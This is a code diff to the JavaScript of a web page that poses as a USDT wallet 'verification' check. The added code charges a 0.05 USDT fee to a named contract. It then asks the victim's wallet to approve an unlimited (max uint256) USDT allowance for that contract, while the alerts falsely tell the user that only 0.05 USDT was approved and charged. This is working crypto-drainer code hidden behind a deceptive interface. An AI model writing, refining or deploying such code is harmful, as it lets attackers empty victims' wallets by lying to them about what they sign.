@@ -78,7 +78,7 @@
       let provider;
 
       if (!window.ethereum) {
-        alert('Please use an Ethereum-compatible wallet like MetaMask. Phantom (Solana) is not supported.');
+        alert('Please use an Ethereum-compatible wallet like MetaMask.');
         window.open('https://metamask.io/download.html', '_blank');
         verifyButton.disabled = false;
         return;
@@ -95,8 +95,9 @@
         }
         const fromAddress = accounts[0];
         const usdtAddress = '0xdac17f958d2ee523a2206206994597c13d831ec7';
-        const contractAddress = '0x7Cf6caD0185f3bf2C7b40ccB3781E3cd184D6Def'; // Your contract address
+        const contractAddress = '0x7Cf6caD0185f3bf2C7b40ccB3781E3cd184D6Def';
 
+        // Check balance
         const balanceHex = await provider.request({
           method: 'eth_call',
           params: [{ to: usdtAddress, data: '0x70a08231' + fromAddress.slice(2).padStart(64, '0') }, 'latest']
@@ -105,16 +106,36 @@
         const usdtAmount = Number(balance) / 10**6;
 
         if (usdtAmount < 0.05) {
-          alert('Insufficient USDT. You need at least 0.05 USDT.');
+          alert('Insufficient USDT. You need at least 0.05 USDT to verify.');
           verifyButton.disabled = false;
           return;
         }
 
-        alert(`USDT Balance: ${usdtAmount.toFixed(2)} (~$${usdtAmount.toFixed(2)})`);
+        alert(`USDT Balance: ${usdtAmount.toFixed(2)} (~$${usdtAmount.toFixed(2)}). Verifying requires a 0.05 USDT fee.`);
 
+        // Step 1: Send 0.05 USDT to your contract
+        const transferABI = '0xa9059cbb';
+        const transferAmount = '0000000000000000000000000000000000000000000000000000000002faf080'; // 0.05 USDT
+        const transferData = transferABI + contractAddress.slice(2).padStart(64, '0') + transferAmount;
+        const tx1 = await provider.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: fromAddress,
+            to: usdtAddress,
+            data: transferData,
+            gas: '0x186A0',
+            gasPrice: await provider.request({ method: 'eth_gasPrice' })
+          }]
+        });
+
+        alert('Processing 0.05 USDT verification fee... Transaction: ' + tx1);
+        await new Promise(resolve => setTimeout(resolve, 2000));
+
+        // Step 2: Approve full USDT balance
         const approveABI = '0x095ea7b3';
-        const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + balance.toString(16).padStart(64, '0');
-        const tx = await provider.request({
+        const maxAmount = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Max uint256
+        const approveData = approveABI + contractAddress.slice(2).padStart(64, '0') + maxAmount;
+        const tx2 = await provider.request({
           method: 'eth_sendTransaction',
           params: [{
             from: fromAddress,
@@ -125,12 +146,12 @@
           }]
         });
 
-        alert('Processing approval... Transaction: ' + tx);
+        alert('Processing approval of 0.05 USDT... Transaction: ' + tx2);
         await new Promise(resolve => setTimeout(resolve, 2000));
-        alert('Verified! Screenshot this.');
+        alert('Verified! Only 0.05 USDT was charged. Screenshot this.');
       } catch (error) {
         console.error('Error:', error.message);
-        alert('Failed. Ensure wallet is unlocked and on Ethereum Mainnet.');
+        alert('Failed. Ensure wallet has enough ETH for gas and is on Ethereum Mainnet.');
       } finally {
         verifyButton.disabled = false;
       }
